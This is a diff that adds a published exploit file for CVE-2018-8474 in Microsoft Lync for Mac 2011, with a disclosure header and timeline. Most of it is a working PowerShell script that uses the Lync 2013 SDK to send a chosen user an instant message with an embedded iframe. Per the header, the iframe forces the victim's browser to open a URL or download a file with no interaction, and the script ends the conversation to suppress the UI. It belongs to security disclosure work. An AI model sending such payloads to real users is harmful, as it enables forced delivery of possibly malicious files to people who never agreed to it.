@@ -1,0 +1,91 @@
+# Exploit Title: Microsoft Lync for Mac 2011 Injection Forced Browsing/Download
+# Author: @nyxgeek - TrustedSec
+
+# Date: 2018-03-20
+# Vendor Homepage: microsoft.com
+# Software Link: https://www.microsoft.com/en-us/download/details.aspx?id=36517
+# CVE: CVE-2018-8474
+# Version: Lync:Mac 2011 14.4.3, likely earlier versions
+# Tested on: Lync:Mac 2011 14.4.3 (170308)
+
+# Description:
+# Force browsing or download via embedded iframe in a chat window. No user
+# interaction required. When the iframe contains a web site URL, a new browser
+# window of the default browser will open with the URL.
+# If the URL is a file, it will download it automatically if it is a permitted
+# file type (e.g., zip)
+
+# A  write-up can be found at:
+# https://www.trustedsec.com/2018/09/full-disclosure-microsoft-lync-for-mac-2011-susceptible-to-forced-browsing-download-attack/
+
+# Requirements: Originating machine needs Lync 2013 SDK installed
+# (https://www.microsoft.com/en-us/download/details.aspx?id=36824)
+
+# Timeline of Disclosure:
+#
+# 07/18/2017 - Reported issue to Microsoft
+# 11/22/2017 - Microsoft has reproduced problem
+# 03/07/2018 - Microsoft replies that they have decided not to fix, but gave
+#              their blessing for disclosure
+
+
+#target user
+$target = "user@domain"
+
+$message = "<iframe src='https://www.youtube.com/watch?v=9Rnr70wCQSA'></iframe>"
+
+
+if (-not (Get-Module -Name Microsoft.Lync.Model))
+{
+    try
+        {
+   # you may need to change the location of this DLL
+            Import-Module "C:\Program Files\Microsoft Office\Office15\LyncSDK\Assemblies\Desktop\Microsoft.Lync.Model.dll" -ErrorAction Stop
+        }
+    catch
+        {
+            Write-Warning "Microsoft.Lync.Model not available, download and install the Lync 2013 SDK http://www.microsoft.com/en-us/download/details.aspx?id=36824"
+        }
+}
+
+ # Connect to the local Skype process
+    try
+    {
+        $client = [Microsoft.Lync.Model.LyncClient]::GetClient()
+    }
+    catch
+    {
+        Write-Host "`nYou need to have Skype open and signed in first"
+        break
+    }
+
+     #Start Conversation
+    $msg = New-Object "System.Collections.Generic.Dictionary[Microsoft.Lync.Model.Conversation.InstantMessageContentType, String]"
+
+    #Add the Message
+    $msg.Add(1,$message)
+
+    # Add the contact URI
+    try
+    {
+        $contact = $client.ContactManager.GetContactByUri($target)
+    }
+    catch
+    {
+        Write-Host "`nFailed to lookup Contact"$target
+        break
+    }
+
+
+    # Create a conversation
+    $convo = $client.ConversationManager.AddConversation()
+    $convo.AddParticipant($contact) | Out-Null
+
+    # Set the message mode as IM
+    $imModality = $convo.Modalities[1]
+    # Send the message
+    $imModality.BeginSendMessage($msg, $null, $imModality) | Out-Null
+    # End the Convo to suppress the UI
+    $convo.End() | Out-Null
+
+    Write-Host "Sent the following message to "$target":`n"$message
